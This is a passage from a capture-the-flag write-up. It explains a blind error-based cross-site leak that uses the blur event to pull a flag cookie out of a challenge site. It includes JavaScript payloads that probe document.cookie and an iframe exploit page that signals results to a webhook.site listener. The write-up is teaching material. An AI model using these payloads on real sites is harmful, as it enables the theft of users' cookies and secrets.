<p>Doing a simple binary search with the <code>with</code> part of the payload, we reach a conclusion about our cookie:</p>
<ul>
<li><code>.with(26)</code> always fail, we know that because we are not getting any hits on our listener</li>
<li><code>.with(25)</code> always pass, we know that because we are getting a hit on our listener!</li>
</ul>
<p>The highest valid index is 25, meaning our flag is 26 characters long! We are successfully able to leak information about our once-so-secret flag!</p>
<p>We performed a <em>&ldquo;Blind Error-based XS-Leak via blur event&rdquo;</em></p>
<h2 id="3-exploiting-the-leak">3. Exploiting the Leak<a href="#3-exploiting-the-leak" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>I made some good progress at this point. I had 8 hours left.</p>
<p>Let&rsquo;s use our error-based leak to reveal the entire flag, somehow, clock is ticking.</p>
<p>I wrote a couple of payloads that rely on the same behavior of <code>.with()</code> to leak several information about the flag.</p>
<p>These are based on our knowledge of length of the flag.</p>
<p><strong>Error-based length leak:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">split</span><span style="color:#e6db74">``</span>.<span style="color:#66d9ef">with</span><span style="color:#e6db74">`25`</span>;
</span></span></code></pre></div><p><strong>Error-based character single-occurrence leak:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// does &#39;f&#39; exist in our cookie?
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>document.<span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">replace</span><span style="color:#e6db74">`f`</span>.<span style="color:#a6e22e">split</span><span style="color:#e6db74">``</span>.<span style="color:#66d9ef">with</span><span style="color:#e6db74">`33`</span>;
</span></span></code></pre></div><p><strong>Error-based character double-occurrence leak:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// does &#39;f&#39; exist twice in our cookie?
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>document.<span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">replace</span><span style="color:#e6db74">`f`</span>.<span style="color:#a6e22e">split</span><span style="color:#e6db74">``</span>.<span style="color:#66d9ef">with</span><span style="color:#e6db74">`38`</span>;
</span></span></code></pre></div><p><strong>Error-based character-at-position leak:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">at</span><span style="color:#e6db74">`0`</span>.<span style="color:#a6e22e">replace</span><span style="color:#e6db74">`f`</span>.<span style="color:#a6e22e">split</span><span style="color:#e6db74">``</span>.<span style="color:#66d9ef">with</span><span style="color:#e6db74">`8`</span>;
</span></span></code></pre></div><p><strong>Error-based character-at-position bypassing filtered characters:</strong>
We can use the following to leak characters we are unable to write otherwise such as <code>_</code>, <code>{</code> and <code>}</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">at</span><span style="color:#e6db74">`25`</span>.<span style="color:#a6e22e">charCodeAt</span><span style="color:#e6db74">`0`</span>.<span style="color:#a6e22e">toString</span><span style="color:#e6db74">`10`</span>.<span style="color:#a6e22e">replace</span><span style="color:#e6db74">`107`</span>.<span style="color:#a6e22e">split</span><span style="color:#e6db74">``</span>.<span style="color:#66d9ef">with</span><span style="color:#e6db74">`8`</span>;
</span></span></code></pre></div><p><strong>Error-based startsWith negative leak:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// slice can be modified to skip filtered chars
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>document.<span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">slice</span><span style="color:#e6db74">`0`</span>.<span style="color:#a6e22e">startsWith</span><span style="color:#e6db74">`flag`</span>.<span style="color:#a6e22e">toString</span><span style="color:#e6db74">``</span>.<span style="color:#a6e22e">split</span><span style="color:#e6db74">``</span>.<span style="color:#66d9ef">with</span><span style="color:#e6db74">`4`</span>;
</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">slice</span><span style="color:#e6db74">`5`</span>.<span style="color:#a6e22e">startsWith</span><span style="color:#e6db74">`ASCWG`</span>.<span style="color:#a6e22e">toString</span><span style="color:#e6db74">``</span>.<span style="color:#a6e22e">split</span><span style="color:#e6db74">``</span>.<span style="color:#66d9ef">with</span><span style="color:#e6db74">`4`</span>;
</span></span><span style="display:flex;"><span>document.<span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">slice</span><span style="color:#e6db74">`11`</span>.<span style="color:#a6e22e">startsWith</span><span style="color:#e6db74">`1`</span>.<span style="color:#a6e22e">toString</span><span style="color:#e6db74">``</span>.<span style="color:#a6e22e">split</span><span style="color:#e6db74">``</span>.<span style="color:#66d9ef">with</span><span style="color:#e6db74">`4`</span>;
</span></span></code></pre></div><p>The payloads above will throw an error and not trigger <code>fetch</code> if true except the last payload <code>startsWith</code> which will throw an error only if the condition is false.</p>
<p>The last payload is very interesting because it is the only one that provide a negative affirmation. It will throw an error and call our listener <em>only</em> if the flag starts with the provided prefix (This is because <code>true</code> is shorter than <code>false</code> üòâ) which proved to be very valuable since incorrect guesses are more probably than correct ones.</p>
<p>We want a confirmation on every single guess telling us it is wrong. If getting a confirmation is the default, we can easily tell whether the issue is with the bot, network issues, timeout issues or any other potential oddities.</p>
<p>It is also special because it is incrementally self-correcting. For every payload we send, we include information from our previous findings confirming any issues we may have had with previous guesses.</p>
<h2 id="4-a-leaky-conclusion">4. A Leaky Conclusion<a href="#4-a-leaky-conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>My method was excruciatingly slow, prone to human error and hard to automate (despite a two-hour failed automation attempt).</p>
<p>Through trial and error, I realized that such asynchronous blind-based attacks require you to provide some indication to tell you which request are you getting the response for, for example, putting a generic <code>/blurred</code> route is a very terrible idea:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://bad.ascwg-challs.app/?name=&#39;%2bdocument.cookie.split``.with`50`%2bwindow.focus``%2b&#39;&#34;</span>
</span></span><span style="display:flex;"><span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>  window.<span style="color:#a6e22e">onblur</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">e</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Focus on iframe&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;https://webhook.site/e550ec1f-2266-46ca-b16a-b46a19835a2b/blurred&#34;</span>);
</span></span><span style="display:flex;"><span>  };
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>Instead, you should use a value that is connected to the value that may have triggered the <code>fetch</code>, like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://bad.ascwg-challs.app/?name=&#39;%2bdocument.cookie.split``.with`50`%2bwindow.focus``%2b&#39;&#34;</span>
</span></span><span style="display:flex;"><span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>  window.<span style="color:#a6e22e">onblur</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">e</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Focus on iframe&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;https://webhook.site/e550ec1f-2266-46ca-b16a-b46a19835a2b/with50&#34;</span>);
</span></span><span style="display:flex;"><span>  };
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>This way, any latency or extremely delayed response, either due to network or bot queueing, does not affect your results.</p>
<p>The two extremely wrong flags I got, which took me over eight hours, were due to sending payload <code>a</code>, response getting delayed, me thinking it is invalid, then moving on to payloads <code>b</code>, <code>c</code>, &hellip; <code>e</code> before receiving the extremely delayed, generic response of payload <code>a</code>.</p>
<p>I would think it is in response to my most recent payload, while in fact, it is reminiscent of a payload I sent 2-3 minutes ago.</p>
<p>Overall, I sent over 800 requests and got two totally garbage flags, before I was able to leak the actual flag.</p>
<p>The last clutch attempt was successful due to two reasons:</p>
<ul>
<li>the more reliable <code>startsWith</code> negative confirmation</li>
<li>My teammate <strong>0xNEF</strong>, who performed a double-pass with me, confirming every single results before we included it into our final flag</li>
</ul>
<p>From here, I believe you can assemble the pieces yourself. Hope you learnt something new and see you in the next one üëã</p>

      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr />
    </div>
    <div class="pagination__buttons">
        
        <span class="button previous">
            <a href="/posts/google-ctf-2024-grand-prix-heaven/">
                <span class="button__icon">‚Üê</span>
                <span class="button__text">Google CTF 2024 Grand Prix Heaven</span>
            </a>
        </span>
        
        
        <span class="button next">
            <a href="/posts/bom-sniffing-to-xss/">
                <span class="button__text">BOM Sniffing to XSS</span>
                <span class="button__icon">‚Üí</span>
            </a>
        </span>
        
    </div>
</div>

  

  <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "elmosalamy" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>¬© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>







  
</div>

</body>
</html>
